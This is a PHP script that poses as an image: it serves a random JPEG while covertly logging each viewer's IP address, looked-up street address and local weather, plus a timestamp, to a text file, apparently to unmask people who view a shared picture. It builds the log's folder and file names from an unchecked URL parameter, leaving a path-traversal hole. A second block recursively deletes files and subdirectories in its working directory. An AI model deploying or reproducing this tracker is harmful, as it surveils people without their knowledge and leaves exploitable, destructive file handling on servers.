<?php
header("Content-type: $jpg.jpg");
$sjs=rand(1,16);
$jpg=rand(1,19);
$png=file_get_contents("$jpg.jpg");
$ppp=$_GET["a"];
preg_match('/(.*)b/',$ppp,$a);
preg_match('/b(.*)/',$ppp,$b);
$a=$a[1];
$b=$b[1];
$ip = $_SERVER["REMOTE_ADDR"]; 
$se=json_decode(file_get_contents("http://opendata.baidu.com/api.php?query=".$ip."&co=&resource_id=6006&t=1433920989928&ie=utf8&oe=utf-8&format=json"),true);
$df=$se["data"][0]["location"];
preg_match('/(.*)\.(.*)\.(.*)\.(.*)/',$ip,$ip);
$ip=$ip[1].".".$ip[2].".".$ip[3].".".$ip[4];

$pi=$_SERVER['HTTP_USER_AGENT'];
function getUA() {
if (isset($_SERVER['HTTP_USER_AGENT'])) {
Return $_SERVER['HTTP_USER_AGENT'];
}else{
Return false;}

}
preg_match_all("/NetType\/(.*?) /",$pi,$wl);
if($wl[1][0]==""){$wl="";}else{$wl= "\n网络类型：".$wl[1][0];//网络类型
}

preg_match_all("/Pixel\/(.*?) /",$pi,$fbl);
if($fbl[1][0]==""){$fbl="";}else{$fbl= "\n分辨率：".$fbl[1][0]."P";}

preg_match_all("/\(Linux; U; (.*?); (.*?)Build\/(.*?)\)/",$pi,$z);
if($z[1][0]==""){$z1="";}else{$z1= "\n安卓版本：".$z[1][0];}
if($z[2][0]==""){$z2="";}else{$z2= "\n设备名称：".$z[2][0];}


$mm = file_get_contents("http://whois.pconline.com.cn/ipJson.jsp?callback=&ip=$ip");
$encode = mb_detect_encoding($mm, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5'));
$str_encode = mb_convert_encoding($mm, 'UTF-8', $encode);
preg_match("/city\":\"(.*?)\"/",$str_encode,$add);
preg_match("/addr\":\"(.*?)\"/",$str_encode,$add1);
$name = $add[1];
$data = file_get_contents("compress.zlib://http://wthrcdn.etouch.cn/weather_mini?city=".$name."");
$encodea = mb_detect_encoding($data, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5'));
$str_encodea = mb_convert_encoding($data, 'UTF-8', $encodea);
preg_match_all("/date\":\"(.*?)\"(.*?)high\":\"(.*?)\"(.*?)fx\":\"(.*?)\"(.*?)low\":\"(.*?)\"(.*?)fl\":\"(.*?)\"(.*?)type\":\"(.*?)\"(.*?)city\":\"(.*?)\"(.*?)date\":\"(.*?)\"(.*?)high\":\"(.*?)\"(.*?)fengli\":\"(.*?)\"(.*?)low\":\"(.*?)\"(.*?)fengxiang\":\"(.*?)\"(.*?)type\":\"(.*?)\"(.*?)date\":\"(.*?)\"(.*?)high\":\"(.*?)\"(.*?)fengli\":\"(.*?)\"(.*?)low\":\"(.*?)\"(.*?)fengxiang\":\"(.*?)\"(.*?)type\":\"(.*?)\"(.*?)date\":\"(.*?)\"(.*?)high\":\"(.*?)\"(.*?)fengli\":\"(.*?)\"(.*?)low\":\"(.*?)\"(.*?)fengxiang\":\"(.*?)\"(.*?)type\":\"(.*?)\"(.*?)ganmao\":\"(.*?)\"/",$str_encodea,$c);
$l=$c[37][0];
$time=file_get_contents("http://hehe.yixuedh.com/api/kp/time.php");

$cnm ="[IP]：".$ip."\n[地址]：".$add1[1]."\n[明日天气]：".$l."\n";
mkdir($a);
$mmp=fopen("$a/$b.txt", "a+");
fwrite($mmp, "\n".$cnm."窥屏时间：".$time."\n");

echo $png;


?>
<?php
$folder="./$a";
function trash($folder,$time=360){
$ext=array('php','gif','html'); //带有这些扩展名的文件不会被删除.
$o=opendir($folder);
while($file=readdir($o)){
        if($file !='.' && $file !='..' && !in_array(substr($file,strrpos($file,'.')+1),$ext)){
                $fullPath=$folder.'/'.$file;
                if(is_dir($fullPath)){
                        trash($fullPath);
                        @rmdir($fullPath);
                } else {
                        if(time()-filemtime($fullPath) > $time){
                                unlink($fullPath);
                                }
                        }
                }
        }
        closedir($o);
}
trash('./');//调用自定义函数
?>